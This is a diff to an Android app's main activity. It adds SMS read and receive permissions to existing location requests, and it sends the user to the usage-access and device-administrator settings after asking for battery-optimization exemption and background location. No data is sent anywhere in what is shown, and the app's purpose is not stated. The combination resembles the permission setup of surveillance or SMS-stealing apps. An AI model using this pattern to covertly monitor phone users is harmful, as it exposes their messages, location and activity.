@@ -19,10 +19,12 @@ class MainActivity : AppCompatActivity() {
         // Permisos basicos
         val permisos = mutableListOf(
             android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.RECEIVE_SMS
         )
 
-        // Permisos de notificaciones (Andrdoid +13)
+        // Permisos de notificaciones (Android +13)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permisos.add(android.Manifest.permission.POST_NOTIFICATIONS)
         }
@@ -34,10 +36,11 @@ class MainActivity : AppCompatActivity() {
             permissionCode
         )
 
+        // Optimizacion de bateria
         @SuppressLint("BatteryLife")
-        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-        intent.data = "package:$packageName".toUri()
-        startActivity(intent)
+        val intentBateria = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+        intentBateria.data = "package:$packageName".toUri()
+        startActivity(intentBateria)
 
         // Requerir ubicacion en segundo plano
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -47,5 +50,13 @@ class MainActivity : AppCompatActivity() {
                 permissionCode + 1
             )
         }
+
+        // Llevar a configuracion de uso de apps
+        val intentUsage = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+        startActivity(intentUsage)
+
+        // Llevar a administradores del dispositivo
+        val intentAdmin = Intent(Settings.ACTION_SECURITY_SETTINGS)
+        startActivity(intentAdmin)
     }
 }
